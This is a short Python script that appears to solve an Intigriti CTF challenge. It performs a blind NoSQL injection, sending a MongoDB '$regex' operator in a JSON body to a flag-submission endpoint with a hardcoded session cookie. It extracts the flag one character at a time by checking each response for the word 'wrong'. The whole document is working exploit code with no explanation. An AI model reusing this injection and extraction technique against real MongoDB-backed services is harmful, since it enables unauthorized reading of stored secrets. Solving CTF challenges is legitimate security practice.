import requests
import string
import sys
from warnings import filterwarnings
filterwarnings('ignore')
def solve(url, charset):
    r = []
    session = {"session":"eyJ1c2VyIjp7Il9pZCI6IjY2NDJhMGQ5YjMyYzRlODBiOWY4N2VlMDQ0YjRmNmY4IiwidXNlcm5hbWUiOiJwd24ifX0.ZVd09g.nRMdh_u4lIkBT90VCJ7GyuVnDIk"}
    proxy = {"https":"http://127.0.0.1:8080"}
    params = {"_id":"_id:3", "challenge_flag":{"$regex":""}}
    for c in charset:
        flag = "^INTIGRITI{h0w_1s_7h4t_" + c
        params['challenge_flag']['$regex'] = flag
        pr = requests.post(url, json=params, cookies=session, verify=False, allow_redirects=False, proxies=proxy)
        if "wrong" not in pr.text:
            print("\rFound flag starting with "+c)
            while True:
                for c2 in charset:                    
                    params['challenge_flag']['$regex'] = flag + c2
                    pr = requests.post(url, json=params, cookies=session, verify=False, allow_redirects=False, proxies=proxy)
                    if "wrong" not in pr.text:
                        flag += c2
                        sys.stdout.write(f"\rflag: {flag}")
                        break
                if c2 == charset[-1]:
                    print("\rFound flag: "+flag[1:])
                    r.append(flag[1:])
                    break
    return r
def main():
    url = 'https://ctfc.ctf.intigriti.io/submit_flag'
    charset = list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'_')
    flag = solve(url, charset)
    print(flag)
if __name__ == '__main__':
    main()
